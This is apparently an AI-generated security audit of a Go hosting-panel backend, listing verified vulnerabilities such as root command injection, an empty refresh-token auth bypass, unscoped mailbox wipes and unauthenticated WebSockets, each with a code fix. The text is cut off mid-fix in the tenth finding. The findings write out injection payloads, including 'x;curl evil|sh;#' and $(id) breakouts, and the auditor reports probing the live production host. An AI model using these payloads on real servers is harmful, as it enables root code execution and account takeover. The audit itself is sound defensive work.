## 1. [critical] Root command injection in CreateForwarder/applyForwarderToPostfix (unescaped source + destinations in `echo '...'`)
- file: backend/internal/services/email_service.go
- line: 1010-1014 (applyForwarderToPostfix); reached from CreateForwarder line 913 and bulk createOrUpdateForwarderRow line 367/382
- fixSafe: True
- reason: Confirmed real and reachable as root. (1) Code matches: email_service.go:1010-1014 builds rewriteCmd with `echo '%s    %s'` interpolating RAW source (line 1013) and dst (strings.Join of composeForwarderDestinations output, line 1005) — neither is shell-escaped. Only srcEsc is escaped, and postfixSedEscape (line 1050-1061, meta=`\.+*?()|[]{}^$/`) does NOT escape the single quote. (2) Executed as root: agent.RunCommand (agent/executor.go:18) runs exec.CommandContext(ctx,'bash','-c',rewriteCmd) directly; ps confirms panel runs as root. (3) No upstream guard: EmailHandler.CreateForwarder (email_handler.go:87) only BodyParses (no validator.Validate); EmailForwarder model (models/email.go:39) has no validate tags; CreateForwarder (email_service.go:886) only does ToLower/TrimSpace with no scope/ownership/safety check. Bulk path createOrUpdateForwarderRow (email_forwarder_bulk_service.go:299-382) only checks strings.Contains(source,'@') and destination '@', so `a'$(id)'@e.com` passes. Programmatic handler (programmatic_handler.go:297) likewise no validation. (4) Asymmetry proven by design intent: CreateMailbox uses validator.IsSafeEmail at email_service.go:442 with an explicit audit-§8a comment; v3.1.110 changelog (version.go:6400-6406) lists the gated sinks as CreateMailbox/DomainService.Create/DNSService.CreateZone/ConfigService.UpdateHostname — the forwarder sink is MISSING from that list. (5) Exploit reproduced locally: feeding source `a'$(touch /tmp/pwned_marker)'@e.com` into the exact echo-quoting construction broke out of the single quotes and executed the command substitution (marker file created, exit 0). Reachable by vendor_admin/vendor_staff/developer/support/customer via POST /api/v1/cpanel/email/forwarders (cpanel_routes.go:117), any staff with email.manage via POST /api/v1/whm/email/forwarders (whm_routes.go:210), and email:write token via the programmatic API (api_routes.go:102) — all with an attacker-controlled JSON {source, destinations}.

**finalFix:**
Gate the shared sink so all three callers (CreateForwarder line 913, bulk lines 367 & 382) are covered at the actual bash -c execution point. validator is already imported in email_service.go (used at line 442). In applyForwarderToPostfix (email_service.go), immediately after the `if source == "" || len(destinations) == 0` check at line 998-1000, add:

	if !validator.IsSafeEmail(source) {
		return fmt.Errorf("invalid forwarder source %q", source)
	}
	for _, d := range destinations {
		if d = strings.TrimSpace(d); d != "" && !validator.IsSafeEmail(d) {
			return fmt.Errorf("invalid forwarder destination %q", d)
		}
	}

This mirrors the existing CreateMailbox guard (email_service.go:442). Verified IsSafeEmail accepts legitimate forwarder addresses (sales@example.com, john.doe+tag@sub.example.co.uk) and rejects injection payloads (a'$(id)'@e.com, "x@y.com; touch /tmp/p"), so it does not break the working feature. Note: the related DeleteForwarder sed sink at line 1435 and the temp-file RebuildVirtualAliasMaps at line 1364 are separate code paths worth a follow-up, but are outside this candidate's scope.

---

## 2. [critical] Root command injection in UpdateSpamSettings (unvalidated domain path + whitelist/blacklist into `echo '...' > path`)
- file: backend/internal/services/email_service.go
- line: 1443-1465
- fixSafe: True
- reason: Confirmed real and reachable. (1) Code matches the quote exactly: email_service.go:1445 builds configPath := fmt.Sprintf("/etc/spamassassin/%s.cf", settings.Domain) and line 1461 runs agent.RunCommand(ctx,"bash","-c",fmt.Sprintf("echo '%s' > %s", content, configPath)); lines 1453-1458 interpolate settings.Whitelist[]/Blacklist[] raw into content. (2) agent.RunCommand (agent/executor.go:18-37) is a direct exec.CommandContext on the host process — no agent indirection, no sandbox — and the panel writes to /etc/spamassassin, /etc/postfix and runs systemctl, i.e. runs as root on the mail host. (3) Reachable by low-privilege callers: cpanel_routes.go:127 registers PUT /api/v1/cpanel/email/spam-settings/:domain inside a group gated ONLY by RequireRole(vendor_admin,vendor_staff,developer,support,customer) (cpanel_routes.go:17-22) — no RequirePermission, no tenant scope; handler UpdateSpamSettings (email_handler.go:107-118) assigns req.Domain = c.Params("domain") with zero validation and body-parses Whitelist/Blacklist. whm_routes.go:233 exposes the same handler behind email.manage. (4) No upstream guard: grep for RequirePermission/CallerScope/AssertOwns in email_handler.go = no matches; UpdateSpamSettings service body never validates. The injection works: domain "x;curl evil|sh;#" yields echo '...' > /etc/spamassassin/x;curl evil|sh;#.cf; a whitelist entry containing a single quote escapes the echo quoting. (5) The fix is the codebase's own established pattern: validator.IsSafeDNSName/IsSafeEmail (validator.go:25-37) were added for exactly this attack ("security audit §8"), are already imported in email_service.go:23, and CreateMailbox (email_service.go:442-447) already gates on them — UpdateSpamSettings is the missed sibling. Validation rejects only malicious/malformed input, so no working feature breaks (note: whitelist/blacklist support glob patterns like *@example.com, so those entries need a shell-safe-glob check rather than strict IsSafeEmail).

**finalFix:**
In backend/internal/services/email_service.go, at the top of UpdateSpamSettings (after line 1443, before building configPath at line 1445), validate the domain and every whitelist/blacklist entry before any command is constructed:

    func (s *EmailService) UpdateSpamSettings(ctx context.Context, settings *models.SpamSettings) error {
        // Domain is interpolated into a root `echo '...' > /etc/spamassassin/<domain>.cf`
        // and the file path — reject anything that isn't a strictly shell-safe DNS name
        // so a crafted :domain can't break out and run commands as root (security audit §8).
        if !validator.IsSafeDNSName(settings.Domain) {
            return fmt.Errorf("invalid domain %q", settings.Domain)
        }
        // whitelist_from / blacklist_from accept glob patterns (e.g. *@example.com), so
        // allow * and ? but reject every shell metacharacter (quotes, ; | & $ ` () ws).
        safeGlob := func(p string) bool {
            if p == "" || len(p) > 320 {
                return false
            }
            for _, r := range p {
                switch {
                case r >= 'A' && r <= 'Z', r >= 'a' && r <= 'z', r >= '0' && r <= '9':
                case r == '@' || r == '.' || r == '_' || r == '-' || r == '+' || r == '%' || r == '*' || r == '?':
                default:
                    return false
                }
            }
            return true
        }
        for _, w := range settings.Whitelist {
            if !safeGlob(w) {
                return fmt.Errorf("invalid whitelist entry %q", w)
            }
        }
        for _, b := range settings.Blacklist {
            if !safeGlob(b) {
                return fmt.Errorf("invalid blacklist entry %q", b)
            }
        }
        configPath := fmt.Sprintf("/etc/spamassassin/%s.cf", settings.Domain)
        ... (rest unchanged)

validator is already imported (email_service.go:23), so no new import is needed. Optionally, also replace the `echo '%s' > %s` write with the heredoc/atomic-write pattern already used a few lines above (line 1403-1409: `cat > tmp <<'BZPANEL_EOF'...` then mv) for defense-in-depth, but the input validation above is the load-bearing fix.

---

## 3. [critical] Empty refresh_token grants a session for an arbitrary active user (auth bypass / account takeover)
- file: backend/internal/services/auth_service.go
- line: 220-228 (service); handler backend/internal/handlers/auth_handler.go:50-62
- fixSafe: True
- reason: Every link in the chain is confirmed in the actual code (v3.1.111, matching the repo). (1) Route is public+unauthenticated: backend/internal/routes/auth_routes.go:15 `auth.Post("/refresh", h.Refresh)` — the `/api/v1/auth` group has no auth middleware (only /me and /2fa subgroups attach middleware.Auth at lines 51,59); global middleware before it is just recover/CORS/RequestLogger (cmd/server/main.go:408-410). (2) Handler does NOT validate: auth_handler.go:50-62 BodyParses into a struct with `validate:"required"` but never calls validator.Validate, so an empty string flows straight to the service (contrast Login at :31 which does validate). (3) Service has no empty guard: auth_service.go:224-228 `col.FindOne(ctx, bson.M{"refresh_token": refreshToken})` with refreshToken=="" matches any doc whose field equals "". (4) models/user.go:31 `RefreshToken string bson:"refresh_token"` (no omitempty) so the field is always persisted as a literal value. (5) Active users with refresh_token:"" provably exist: the seeders write `$set {refresh_token:""}` on active owners (cmd/seed/main.go:150 with is_active:true and no refresh_expires_at; cmd/bzpanel/main.go:477-480 the production owner password-reset CLI sets refresh_token:"" + refresh_expires_at:nil on the active owner), and Logout (auth_service.go:363-364) `$set {refresh_token:""}` on every logout. For these, all four guards pass: IsActive=true, DeletedAt=nil, LockedUntil=nil, and RefreshExpiresAt=nil (seed/bzpanel) so the `!= nil` expiry check is skipped. A valid access_token is then minted (jwt.GenerateAccessTokenFull) for an attacker-uncontrolled victim and the victim's refresh token is rotated to a random value — unauthenticated cross-account/cross-tenant takeover plus victim-session DoS. The candidate slightly overstated two writers: ResetPassword (auth_service.go:568) and ChangePassword (:666) use $unset, not $set"", so those specific users are NOT matched by {refresh_token:""}; and suspend/trash (user_service.go:555,1020) set is_active=false/deleted_at so they're guarded. This narrowing does not refute the bug — the seeders, the production bzpanel owner-reset CLI, and ordinary Logout all leave active accounts in the exact vulnerable state, which is enough. (Note: live DB count could not be re-confirmed here — the production Mongo query was blocked by the sandbox PII/unnamed-host policy — but the seed/bzpanel code paths make the vulnerable state guaranteed, not probabilistic.)

**finalFix:**
backend/internal/services/auth_service.go — add an empty-token guard at the top of RefreshToken() (line ~221, before the FindOne). This is surgical and closes the hole regardless of which writer produced the empty value and regardless of handler validation:

func (s *AuthService) RefreshToken(ctx context.Context, refreshToken string) (*models.LoginResponse, error) {
	refreshToken = strings.TrimSpace(refreshToken)
	if refreshToken == "" {
		return nil, errors.New("invalid refresh token")
	}
	col := s.db.Collection(database.ColUsers)
	...

Ensure "strings" is imported. Apply the identical guard to Logout() (line 361) so a logout with "" can't blanket-clear a random active user's token. Belt-and-braces (optional, not strictly required to close the bypass): add `if errs := validator.Validate(body); errs != nil { return response.BadRequest(c, "Validation failed", errs) }` in handlers/auth_handler.go Refresh() after BodyParser. None of these break the legitimate refresh flow, which always passes a non-empty 64-char hex token.

---

## 4. [critical] Authenticated shell-injection (and cross-tenant leak) via unvalidated :domain in resources/bandwidth/:domain
- file: backend/internal/handlers/resource_handler.go
- line: 56-63 (handler BandwidthByDomain) -> service backend/internal/services/resource_service.go:554-574 (esp. 559-560)
- fixSafe: True
- reason: Confirmed real and reachable. ResourceHandler.BandwidthByDomain (resource_handler.go:56-63) takes c.Params("domain") with zero validation and passes it to ResourceService.BandwidthByDomain (resource_service.go:554-574), which builds `awk '{sum+=$10} END {print sum}' /var/log/nginx/<domain>-access.log 2>/dev/null` (line 560) and `wc -l < /var/log/nginx/<domain>-access.log` (line 567) and runs both via agent.RunCommand(ctx,"bash","-c",cmd) = exec.CommandContext("bash","-c",cmd) (executor.go:18-37). No shellQuote, unlike the sibling TrafficStatsByDomain which deliberately wraps the path with shellQuote (lines 658, 729) — proving the maintainers know this value is shell-dangerous and this function omits it. Reachability is real: cpanel_routes.go:272 registers it under the group at cpanel_routes.go:17-22 with NO per-route permission, allowing vendor_admin/vendor_staff/developer/support and even customer; InjectScope (tenant_scope.go:16-29) only attaches caller context and does not validate the param, and BandwidthByDomain never reads CallerScope, so there is also no tenant-ownership check. I empirically verified the param-to-bash link: a local test against the project's own Fiber v2.52.5 showed raw (unencoded) shell metacharacters in a single path segment reach c.Params verbatim — `$(id)`, `x;id`, x-backtick-id-backtick, `x|id`, `x&&id` all returned status=200 with PARAM=[<payload>] intact. main.go's fiber.Config (cmd/server/main.go:377-405) does not set UnescapePath, but that is irrelevant: the attack sends raw metacharacters, not percent-encoded ones (percent-encoded `%24%28id%29` stays literal and is harmless). Production nginx fronts the app with `proxy_pass http://127.0.0.1:8080;` (install.sh:1821-1839) which forwards the URI to Fiber without stripping `$ ( ) ; | & backtick`. Net: GET /api/v1/cpanel/resources/bandwidth/$(curl...) executes as the panel run-user = RCE. Note one candidate inaccuracy: the sibling DomainUsage is NOT injectable because it first does FindOne({"domain":domain}) (line 312) and returns "domain not found" for a payload that matches no DB doc, gating the shell call; BandwidthByDomain has no such DB lookup, which is exactly why it is the exploitable one. SSH to the live box was unreachable (port 22 and common alternates timed out / filtered), so I could not produce a runtime PoC, but the code path and the Fiber param behavior are conclusively demonstrated locally.

**finalFix:**
Surgical, package-local fix mirroring the existing TrafficStatsByDomain pattern (shellQuote is in the same `services` package, config_service.go:896). In backend/internal/services/resource_service.go BandwidthByDomain, quote the log path in both commands:

  func (s *ResourceService) BandwidthByDomain(ctx context.Context, domain string) (map[string]interface{}, error) {
      usage := map[string]interface{}{"domain": domain}
      logFile := fmt.Sprintf("/var/log/nginx/%s-access.log", domain)
      qLog := shellQuote(logFile)
      cmd := fmt.Sprintf("awk '{sum+=$10} END {print sum}' %s 2>/dev/null", qLog)   // line 560
      if result, err := agent.RunCommand(ctx, "bash", "-c", cmd); err == nil {
          totalBytes, _ := strconv.ParseInt(strings.TrimSpace(result.Output), 10, 64)
          usage["total_bytes"] = totalBytes
      }
      cmd = fmt.Sprintf("wc -l < %s 2>/dev/null", qLog)   // line 567
      if result, err := agent.RunCommand(ctx, "bash", "-c", cmd); err == nil {
          count, _ := strconv.ParseInt(strings.TrimSpace(result.Output), 10, 64)
          usage["request_count"] = count
      }
      return usage, nil
  }

Defense-in-depth (recommended, also low-risk): in ResourceHandler.BandwidthByDomain (resource_handler.go:56-63) add an input guard before calling the service, reusing the existing regex:
  domain := c.Params("domain")
  if !whoisDomainRe.MatchString(domain) { return response.BadRequest(c, "Invalid domain", nil) }
(whoisDomainRe is defined in domain_handler.go:311; both files are package handlers.) Apply the same shellQuote treatment to the bandwidth awk/wc lines in DomainUsage (resource_service.go:429,433,443) for consistency even though its FindOne lookup already gates it. None of this changes behavior for legitimate domain values, so no working feature breaks.

---

## 5. [high] B-06: Files step creates a duplicate '<user>@localhost' customer row that collides with the real migrated vendor on username (no username unique index)
- file: backend/internal/services/transfer_service.go
- line: 1694-1717 (insert) interacting with transfer_panel_records.go:810-847 (mirrorPanelUsers) and :594-625 (syncUsersForTransfer)
- fixSafe: True
- reason: Verified in code. (1) transfer_service.go:1694-1717 upserts a users row keyed ONLY on {username: di.sysUser} with email=di.sysUser+"@localhost", role="customer". di.sysUser is the linux owner of /home/<owner>/domains/<dom> on the source (resolved at 1504-1519), i.e. the panel user's username. (2) Ordering confirmed: "Transfer Domains & Files" (line 1464+) runs BEFORE "Sync Panel Records" (line 3372 -> transferPanelRecords:83 -> mirrorPanelUsers). (3) mirrorPanelUsers Step 2 (transfer_panel_records.go:764-807) deletes destination non-owner rows ONLY when their EMAIL is in the source email set; the placeholder email <user>@localhost is never a source email, so it is preserved (preservedDestOnly). Step 3 (810-847) then InsertOne's the real source user (same linux username, role vendor_admin, real non-localhost email) which SUCCEEDS because the only unique index is on email (database/indexes.go:130-133: email unique, role non-unique, NO username index). Result: two users rows share the same username. (4) Downstream impact is real: many FindOne(bson.M{"username": ...}) lookups exist (tenant_scope.go:309 LookupVendorEmailForUsername, backup_service.go:420, project_service.go:1161, domain_service.go:301, guest_link_service.go:320, events.go:66, transfer_service.go:3111 FTP) — FindOne returns an arbitrary one of the two duplicates, so LookupVendorEmailForUsername can return <user>@localhost instead of the real vendor email (feeds SSL Issue-Certificate autofill and the notifier "send to vendor reg email" rule), and the bogus login-less customer is a stray row in /whm/users. No upstream guard: no username unique index anywhere in the codebase, no placeholder cleanup, and the Files step runs first so it cannot see the real user. I could not re-pull the live source roster to re-confirm the runtime detail (SSH port 22 and common alternates are firewalled from this environment, TCP timeout), but the bug does not depend on that specific data — it holds for any source whose domains are owned by a non-customer panel user.

**finalFix:**
Surgically remove the Files-step placeholder rows for every migrated username before/while mirrorPanelUsers re-seeds the source roster. The placeholder is uniquely identifiable (synthetic email == "<username>@localhost", role "customer"), so a legitimately-migrated plain customer (which carries a real source email) is never touched.

In backend/internal/services/transfer_panel_records.go, inside mirrorPanelUsers, after Step 2's preservedDestOnly logging block (after line 807) and before "Step 3 — insert every non-owner source user." (line 809), add:

	// Drop the synthetic "<user>@localhost" customer placeholders that the
	// Transfer Domains & Files step created (transfer_service.go:1694-1717).
	// They are keyed on username only, with no username unique index, so the
	// real source row (different email) inserts cleanly below and you end up
	// with two users sharing one username. The placeholder is identifiable by
	// its synthetic @localhost email + role=customer; real migrated customers
	// carry a real source email and are not matched.
	for _, d := range docs {
		uname, _ := d["username"].(string)
		uname = strings.TrimSpace(uname)
		if uname == "" {
			continue
		}
		if res, err := col.DeleteMany(ctx, bson.M{
			"username": uname,
			"email":    uname + "@localhost",
			"role":     "customer",
		}); err == nil && res.DeletedCount > 0 {
			s.addLog(ctx, jobID, "info",
				fmt.Sprintf("Removed %d file-step placeholder account(s) for %q (real panel user takes over).", res.DeletedCount, uname),
				"panel-records")
		}
	}

(strings and fmt are already imported in this file.) Optionally, defense-in-depth: add a partial/sparse unique index on username in backend/internal/database/indexes.go ColUsers — {Keys: bson.D{{Key: "username", Value: 1}}, Options: options.Index().SetUnique(true).SetPartialFilterExpression(bson.M{"username": bson.M{"$exists": true, "$ne": ""}})} — but only after auditing for any existing duplicate-username rows, since EnsureIndexes would error on a dup-laden collection; the DeleteMany cleanup above is the necessary minimal fix.

---

## 6. [high] B-07: reencryptSyncedMailboxes $unset encrypted_pass via UnitMany is UNSCOPED across ALL destination mailboxes when source JWT_SECRET is unreadable
- file: backend/internal/services/transfer_panel_records.go
- line: 3136-3148
- fixSafe: True
- reason: Code matches the quote exactly (lines 3136-3148). Reachability confirmed: transferPanelRecords runs for any Betazen-to-Betazen server transfer (transfer_service.go:3373-3384, gated only on ServerType serverpanel/empty), and unconditionally calls reencryptSyncedMailboxes (line 252). The srcJWT=="" branch is genuinely reachable: this JWT_SECRET fetch uses a SINGLE probe (grep /opt/serverpanel/.env, line 3133), whereas fetchSourceEncKey (transfer_service.go:157) needs FOUR probes (primary/legacy/sudo/proc) for the very same file precisely because it is frequently unreadable to a non-root SSH user, a relocated install, or a deleted .env. The damage is real and unscoped: ColMailboxes is one flat collection (models/email.go:8-19 has a domain field per doc; database/collections.go:13). mirrorPanelUsers explicitly PRESERVES destination-only vendors and their teams during a transfer (the v3.1.99 fix at lines 754-763: "leave every destination-only vendor + its team intact"), so a destination box legitimately hosts other tenants' mailboxes that were never part of the migration. Those mailboxes were sealed with encryptPassword(pass, LOCAL jwtSecret) (email_service.go:577,678) i.e. under the DESTINATION's own JWT_SECRET, so their SSO works. The failure-path UpdateMany filter {encrypted_pass:{$exists,$ne:""}} has no domain/tenant/transfer-set scope and $unsets every one of them, silently breaking webmail "Open" SSO for unrelated tenants until each owner manually resets a password. The bug is in fact broader than the candidate stated: (a) the success-path Find at lines 3150-3151 is ALSO unscoped, so even when srcJWT is readable, every destination-only mailbox fails ReencryptForTransfer(blob, srcJWT) (wrong key) and gets $unset (cleared++); and (b) because the wipe is decoupled from the actual transferred mailbox set, a transfer importing ZERO overlapping mailboxes still nukes every pre-existing tenant's SSO. The intended-safe behavior is proven by the sibling HealStaleSSOEncryption (email_service.go:181-228): it REFUSES to clear when its key is empty ("we'd clear EVERY row, which is destructive") and only clears rows that fail to decrypt under the LOCAL key — neither safeguard exists here. No test pins the current behavior, and the immediately-preceding syncByDomain (line 235) already scopes by ownedDomains, so scoping this pass is consistent and low-risk.

**finalFix:**
Scope both the failure-path wipe and the success-path scan to the transfer's domain set. Pass ownedDomains (map[string]bool, already in scope at the call site line 252) into reencryptSyncedMailboxes and build a domain slice, then constrain both queries.

1) transfer_panel_records.go:252 — change the call to pass ownedDomains:
   stats["mailbox_sso_reencrypted"] = s.reencryptSyncedMailboxes(ctx, jobID, host, port, sshUser, sshPass, ownedDomains)

2) transfer_panel_records.go:3119 — add the param and build the slice:
   func (s *TransferService) reencryptSyncedMailboxes(ctx context.Context, jobID, host string, port int, sshUser, sshPass string, ownedDomains map[string]bool) int {
       ...
       ownedList := make([]string, 0, len(ownedDomains))
       for d := range ownedDomains { ownedList = append(ownedList, d) }
       if len(ownedList) == 0 { return 0 } // nothing migrated -> nothing to re-key/wipe

3) transfer_panel_records.go:3144-3146 — scope the failure-path UpdateMany:
   mbCol.UpdateMany(ctx,
       bson.M{"domain": bson.M{"$in": ownedList}, "encrypted_pass": bson.M{"$exists": true, "$ne": ""}},
       bson.M{"$unset": bson.M{"encrypted_pass": ""}})

4) transfer_panel_records.go:3151 — scope the success-path Find the same way:
   cur, err := mbCol.Find(ctx, bson.M{"domain": bson.M{"$in": ownedList}, "encrypted_pass": bson.M{"$exists": true, "$ne": ""}})

This restricts every $unset to mailboxes that actually belong to the transfer's domains, matching the syncByDomain scoping used one line earlier, and leaves every destination-only tenant's working SSO blob untouched.

---

## 7. [high] B-07b: reencryptSyncedMailboxes success path also iterates ALL destination mailboxes and $unsets encrypted_pass for destination-only mailboxes that don't decrypt under the source key
- file: backend/internal/services/transfer_panel_records.go
- line: 3150-3182
- fixSafe: True
- reason: Verified against the actual code. (1) The success-path cursor at line 3151 is fully unscoped: mbCol.Find(ctx, {encrypted_pass:{$exists,$ne:""}}) returns EVERY mailbox in ColMailboxes, not just migrated ones. (2) For each row it calls EmailService.ReencryptForTransfer(mb.EncryptedPass, srcJWT) -> decryptPassword which is AES-GCM keyed on SHA256(srcKey) (email_service.go:49-72); a destination-only mailbox's blob was sealed under the DESTINATION JWT_SECRET, so gcm.Open fails -> rErr != nil -> line 3175 $unset encrypted_pass, destroying working webmail SSO. (3) Destination-only mailboxes genuinely survive to this point: mirrorPanelUsers Step 2 (lines 754-807) explicitly PRESERVES destination-only accounts not present on the source ("Preserved %d destination-only account(s)"), and insertDeduped (line 1041-1043) leaves pre-existing destination mailboxes untouched ("continue // already on destination"). Nothing deletes those mailboxes. (4) ownedDomains (syncUsersForTransfer, lines 627-645) holds only the source picked-users' domains, so destination-only mailboxes are on domains never in ownedDomains and always get the wrong key. (5) Reachable: any vendor_owner Server Transfer with EmailData into a destination that already has its own mailboxes triggers it on the normal happy path (srcJWT readable), independent of B-07's unreadable-key path. The candidate quotes the code accurately and the trigger path is real and unguarded.

**finalFix:**
Scope both the warn-path UpdateMany and the success-path Find to the transfer's own domains so destination-only mailboxes are never touched. Plumb ownedDomains into the function and build a domain $in list.

1) Caller (line 252):
   stats["mailbox_sso_reencrypted"] = s.reencryptSyncedMailboxes(ctx, jobID, host, port, sshUser, sshPass, ownedDomains)

2) Signature (line 3119):
   func (s *TransferService) reencryptSyncedMailboxes(ctx context.Context, jobID, host string, port int, sshUser, sshPass string, ownedDomains map[string]bool) int {

3) Build a domain filter and apply it to both queries. Near the top of the body:
   domainList := make([]string, 0, len(ownedDomains))
   for d := range ownedDomains { domainList = append(domainList, d) }
   if len(domainList) == 0 { return 0 } // nothing migrated -> nothing to re-key

   Warn path (lines 3144-3146):
   mbCol.UpdateMany(ctx,
       bson.M{"domain": bson.M{"$in": domainList}, "encrypted_pass": bson.M{"$exists": true, "$ne": ""}},
       bson.M{"$unset": bson.M{"encrypted_pass": ""}})

   Success path (line 3151):
   cur, err := mbCol.Find(ctx, bson.M{"domain": bson.M{"$in": domainList}, "encrypted_pass": bson.M{"$exists": true, "$ne": ""}})

This still re-keys every newly-imported source mailbox (all imported mailboxes are keyed by domain into ownedDomains in syncByDomain at lines 235-236), so the SSO-heal feature is unaffected, while destination-only mailboxes keep their valid destination-sealed encrypted_pass. Closes B-07 and B-07b together.

---

## 8. [high] B-11 confirmed: mail-log ingestor `tail -n 0 -F` starts at EOF — every message Postfix processed during panel downtime is permanently absent from the mail log
- file: backend/internal/services/mail_log_service.go
- line: 161 (cmd := exec.CommandContext(ctx, "tail", "-n", "0", "-F", mailLogPath)); design note lines 13-17
- fixSafe: True
- reason: Code is exactly as quoted: line 161 runs `exec.CommandContext(ctx, "tail", "-n", "0", "-F", mailLogPath)`; design note (lines 13-17) admits "On panel restart we start at end-of-file; the sub-second gap is negligible and upserts are idempotent anyway." `tail -n 0` definitively positions at EOF and emits only lines appended AFTER it starts, so any mail.log lines written while the Go process is down are never read. Reachable: StartIngestor is called unconditionally from main.go:364 on every boot. Not guarded upstream: grep confirms tailLoop is the SOLE writer of ColMailLogs (the Sieve/webhook path in mail_incoming_handler.go writes a different feature and never touches mail_logs), and there is no persisted offset, no inode tracking, and no back-scan anywhere. The "idempotent upsert" defense is irrelevant because the lines are never ingested at all. The "sub-second gap" comment is false for the real trigger — a full panel restart/deploy (`systemctl restart serverpanel`), crash, or OOM-kill is seconds-to-minutes, during which Postfix keeps delivering/bouncing/writing log lines that are silently and unrecoverably dropped. This collection's documented purpose (collections.go:110-123, version.go:6338-6361) is to capture EVERY message from every source, so the gap is a genuine audit/compliance completeness defect with no error and no recovery.

**finalFix:**
backend/internal/services/mail_log_service.go:161 — replace the EOF-only tail with a bounded recent-tail backfill so a restart re-reads the recent window before following. Idempotent upserts (log_key = "<queue_id>:<first_seen_unix>", lines 413/444-477) make re-read lines update the same rows, so no duplicates result:

    cmd := exec.CommandContext(ctx, "tail", "-n", "5000", "-F", mailLogPath)

(Optionally factor the count to a const, e.g. `mailLogBackfillLines = 5000`, and update the line-152 comment from "-n0" to "-n N". A fuller fix would persist inode+byte-offset and resume via `tail -c +OFFSET` with rotation detection, but the bounded `-n N` is the minimal, surgical change that closes the restart gap without altering correlation/classification/flush logic.)

---

## 9. [high] Interactive terminal WebSocket never re-checks suspended/deleted account (suspend bypass)
- file: backend/internal/handlers/terminal_handler.go
- line: 60-76
- fixSafe: True
- reason: Verified against the actual code. NewTerminalWSHandler (terminal_handler.go:60-76) authenticates ONLY via jwt.ValidateToken and never consults is_active/deleted_at, unlike middleware.Auth (auth.go:105 -> isUserAllowed at auth.go:40, which checks is_active and denies on a missing doc). The route (main.go:485-492) is registered with only a WebSocket-upgrade gate and NO middleware.Auth in front, and the nginx /ws/ location (config_service.go:1000) is a bare proxy_pass with no auth_request. Suspend (user_service.go:552) and soft-delete (user_service.go:1015) both set is_active=false + clear the refresh token + authcache.Invalidate, which kicks the user off all normal routes within ~15s; the terminal path bypasses every layer of this. Worse, LookupOwnUsername (tenant_scope.go:339) does a plain _id lookup with no is_active/deleted_at filter, so even a suspended or soft-deleted vendor_admin/vendor_staff/developer/support still resolves their username and gets a shell, and a soft-deleted user's document still exists (deleted_at set, not removed). The panel process runs as root (it runs usermod/nginx writes via agent.RunCommand), so su - <user> succeeds without a password even though suspend ran usermod -L (-L only blocks password auth, not root-initiated su); the shell genuinely opens. Two corrections to the candidate, both increasing severity: (1) the access-token TTL default is 4h (config.go:129 JWT_ACCESS_EXPIRY=4h), not 15 min, so the bypass window is up to ~4 hours; the 15-min figure only applies to impersonation tokens. (2) The guest role is already handled by the switch default ("Unauthorized role"), so the guest part of the proposed fix is redundant (harmless). The core finding stands and is reachable by any holder of a still-valid access token after being suspended or soft-deleted.

**finalFix:**
In backend/internal/handlers/terminal_handler.go, right after the successful jwt.ValidateToken block (after line 75), re-check account status before spawning any shell. Since middleware.isUserAllowed is unexported, query the users collection directly (the handler already has db):

	// Account status check: a suspended (is_active=false) or soft-deleted
	// (deleted_at set) user must NOT keep a working shell via an existing
	// valid JWT. Mirrors middleware.Auth's isUserAllowed gate, which this
	// WebSocket route otherwise bypasses entirely.
	{
		statusCtx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		oid, oidErr := primitive.ObjectIDFromHex(claims.UserID)
		var u struct {
			IsActive  bool        `bson:"is_active"`
			DeletedAt interface{} `bson:"deleted_at"`
		}
		err := mongo.ErrNoDocuments
		if oidErr == nil {
			err = db.Collection(database.ColUsers).FindOne(statusCtx, bson.M{"_id": oid}).Decode(&u)
		}
		cancel()
		if oidErr != nil || err != nil || !u.IsActive || u.DeletedAt != nil {
			c.WriteMessage(websocket.TextMessage, []byte("\r\n\x1b[31mError: account suspended or deleted\x1b[0m\r\n"))
			c.Close()
			return
		}
	}

Add imports: "go.mongodb.org/mongo-driver/bson", "go.mongodb.org/mongo-driver/bson/primitive", and the database package ("github.com/betazeninfotech/whm-cpanel-management/internal/database") for database.ColUsers (mongo and context are already imported). Cleaner alternative: export a wrapper such as middleware.IsUserAllowed(ctx, db, userID) and call it here so the cache and exact semantics match auth.go.

---

## 10. [high] Install-terminal WebSocket is completely unauthenticated (install-output disclosure)
- file: backend/internal/handlers/ws_handler.go
- line: 12-20 (handler); route cmd/server/main.go:491
- fixSafe: False
- reason: Confirmed by code + runtime. HandleInstallTerminalWS (ws_handler.go:12-20) registers a TerminalClient on the global installHub with NO authentication: no c.Query("token"), no jwt.ValidateToken, no role/tenant check — it calls hub.Register(client) immediately. Route main.go:491 (app.Get("/ws/install-terminal", websocket.New(handlers.HandleInstallTerminalWS))) is gated only by the IsWebSocketUpgrade middleware at main.go:485-490. Global middleware (main.go:408-410) is recover/CORS/RequestLogger only — no JWT; the JWT-gated /api/v1/whm and /api/v1/cpanel groups are registered separately and never cover /ws/*. terminal_hub.go shows a single process-global installHub whose Broadcast() fans out to every registered client (not tenant-scoped). software_service.go:528-605 broadcasts raw step output (apt/systemctl stdout via agent.Install* helpers, error_message, hostnames, domains, file paths) for email-server installs. Runtime: an unauthenticated WS upgrade to https://panel.betazeninfotech.com/ws/install-terminal (through nginx) returned HTTP/1.1 101 Switching Protocols and, crucially, did NOT emit the in-band "Authentication required" rejection that /ws/terminal sends — i.e. the connection is accepted and the client is subscribed. Caveats vs the hunter's claims: (1) the 101 status alone is not proof of missing auth — the authenticated /ws/terminal route ALSO returns 101 because its auth is in-handler post-upgrade; the real proof is the total absence of any validation in the install handler plus the absence of the rejection message. (2) The disclosed data is primarily install/infra detail (command output, hostnames, domains, paths); DKIM private keys are written to disk, not broadcast (email_install.go:303 returns only a status string + apt output) — so this is install-output information disclosure, not a direct plaintext-credential leak. Severity high stands because installs are owner/admin operations and the hub is global/cross-tenant.

**finalFix:**
Two-part fix required — backend-only is NOT safe because the current frontend connects with no token (frontend/apps/whm/src/components/EmailServerInstall.tsx:130 builds wsUrl with no ?token=), so adding a backend token requirement alone breaks the live install-progress view.

1) Backend — make ws_handler.go authenticate before Register, mirroring terminal_handler.go. Change the signature to inject deps and validate first:

  // ws_handler.go
  func NewInstallTerminalWSHandler(jwtSecret string) func(*websocket.Conn) {
      return func(c *websocket.Conn) {
          token := c.Query("token")
          if token == "" { c.Close(); return }
          claims, err := jwt.ValidateToken(jwtSecret, token)
          if err != nil { c.Close(); return }
          // install/software ops are owner/admin only
          if claims.Role != "vendor_owner" && claims.Role != "vendor_admin" {
              c.WriteMessage(websocket.TextMessage, []byte("forbidden")); c.Close(); return
          }
          hub := services.GetInstallHub()
